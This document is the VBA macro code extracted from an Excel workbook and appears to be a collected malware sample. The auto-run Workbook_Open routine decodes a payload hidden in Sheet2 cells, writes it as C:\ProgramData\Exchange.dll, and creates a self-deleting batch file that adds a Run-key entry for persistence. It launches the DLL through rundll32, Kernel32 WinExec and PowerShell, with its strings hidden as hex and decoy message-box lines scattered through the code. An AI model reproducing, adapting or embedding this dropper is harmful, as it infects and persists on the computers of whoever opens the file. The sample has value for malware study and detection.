Attribute VB_Name = "Module1"
Sub jjj()

End Sub
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Function Ktojyd(h)
  Dim a: a = Split(h)
  Dim i
  For i = 0 To UBound(a)
      a(i) = Chr("&H" & a(i))
  Next
  h2s = Join(a, "")
  Ktojyd = h2s
End Function
Sub Workbook_Open()
    On Error GoTo 0
    Dim url
    mykk = "EBSWUgxTIy"
    Dim g
    d = "MsgBox ('For ML, Yes,')"
    Dim AC
    For i = 1 To 70
        Celles = "A" + CStr(i)
        A1 = ThisWorkbook.Sheets("Sheet2").Range(Celles).Value
        If A1 = "" Then
            Exit For
        End If
        AC = AC + A1
    Next i
    Dim o
    d = "MsgBox ('Are you ok ?')"
    Set Ofile = CreateObject("Scripting.FileSystemObject")
    o = wMKPFrT(mykk, AC)
    Dim dd
    dd = Ktojyd("43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c")
    my_b64 = mDriOd(o)
    Set WText = Ofile.CreateTextFile(dd)
    WText.WriteLine Left(my_b64, Len(my_b64) - 1)
    WText.Close
    Dim func
    func = Ktojyd("43 41 4c 4c")
    Dim lib
    lib = Ktojyd("4b 65 72 6e 65 6c 33 32")
    Dim ok
    ok = Ktojyd("57 69 6e 45 78 65 63")
    Dim go
    Dim goo
    goo = Ktojyd("52 45 47 20 41 44 44 20 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 20 2f 76 20 41 75 74 6f 53 74 61 72 74 20 2f 74 20 52 45 47 5f 53 5a 20 2f 64 20 22 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74 22 20 26 26 20 44 45 4c 20 22 25 7e 66 30 22")
    Set WText = Ofile.CreateTextFile(Ktojyd("43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74"))
    WText.WriteLine goo
    WText.Close
    Dim lets
    lets = Ktojyd("63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74")
    Application.ExecuteExcel4Macro Replace(Replace(Replace(Replace("{{}}(""[]"", ""{^}"", ""JCCJ"", ""[*]"", 0)", "{{}}", func), "[]", lib), "{^}", ok), "[*]", lets)
    go = Ktojyd("70 6f 77 65 72 73 68 65 6c 6c 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74")
    Application.ExecuteExcel4Macro Replace(Replace(Replace(Replace("{{}}(""[]"", ""{^}"", ""JCCJ"", ""[*]"", 0)", "{{}}", func), "[]", lib), "{^}", ok), "[*]", go)
    d = "MsgBox ('My Application for Scalary')"
End Sub
Function wMKPFrT(Key, message)
    Dim constr
    Dim intCounter
    a = Split(message, ",")
    msg_len = UBound(a)
    For x = 0 To msg_len
        key_a = Mid(Key, intCounter + 1, 1)
        If intCounter = Len(Key) Then
            intCounter = 0
            key_a = Mid(Key, intCounter + 1, 1)
        End If
        intCounter = intCounter + 1
        Dim ll
        ll = CInt("&H" & Replace(a(x), "0x", ""))
        fg = ll - (Asc(key_a) + 256) Mod 256
        decode_a = Chr(fg)
        constr = constr + decode_a
    Next
    wMKPFrT = constr
End Function
Function mDriOd(ByVal base64String)
        login = "MsgBox ('User and Password is correct.')"
        b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        Dim stringlen, resOut, grpBegin
        stringlen = Len(base64String) - 1
        newstring = Left(base64String, stringlen)
        For grpBegin = 1 To stringlen Step 4
                Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
               numDataBytes = 3
               nGroup = 0
               For CharCounter = 0 To 3
                   thisChar = Mid(newstring, grpBegin + CharCounter, 1)
                   If thisChar = "=" Then
                       numDataBytes = numDataBytes - 1
                        thisData = 0
                    Else
                        thisData = InStr(1, b64, thisChar, vbBinaryCompare) - 1
                    End If
                    nGroup = 64 * nGroup + thisData
                Next
            nGroup = Hex(nGroup)
           nGroup = String(6 - Len(nGroup), "0") & nGroup
           pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + Chr(CByte("&H" & Mid(nGroup, 3, 2))) + Chr(CByte("&H" & Mid(nGroup, 5, 2)))
           resOut = resOut & Left(pOut, numDataBytes)
       Next
       mDriOd = resOut
End Function



INQUEST-PP=macro
